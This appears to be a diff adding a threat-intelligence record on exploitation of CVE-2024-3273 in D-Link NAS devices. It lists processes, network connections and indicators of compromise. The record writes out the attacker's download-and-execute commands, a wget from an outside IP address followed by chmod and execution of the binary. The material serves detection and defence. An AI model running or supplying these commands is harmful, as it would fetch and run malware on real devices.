@@ -1,0 +1,35 @@
+description: "Remote code execution via CVE\u20112024\u20113273 on D\u2011Link NAS\
+  \ devices using a command injection that downloads and executes a shell script."
+attribution: Unknown threat actor
+TTPs:
+  processes:
+  - wget
+  - chmod
+  - ./skid.x86
+  commandline:
+  - wget http://38.6.224.248/skid.x86
+  - chmod +x skid.x86
+  - ./skid.x86
+  powershell: []
+  scripting_engine:
+  - shell script
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: wget
+    destination_ip: 38.6.224.248
+    port: 80
+  file_activity:
+  - /tmp/skid.x86
+  persistence: []
+  process_relations: []
+IOCs:
+  ip_addresses:
+  - 38.6.224.248
+  urls:
+  - http://38.6.224.248/skid.x86
+authors:
+- Matthew Remacle
+reference: https://www.greynoise.io/blog/cve-2024-3273-d-link-nas-rce-exploited-in-the-wild
+date_of_publication: April 11, 2024
+file_creation_date: September 10, 2025
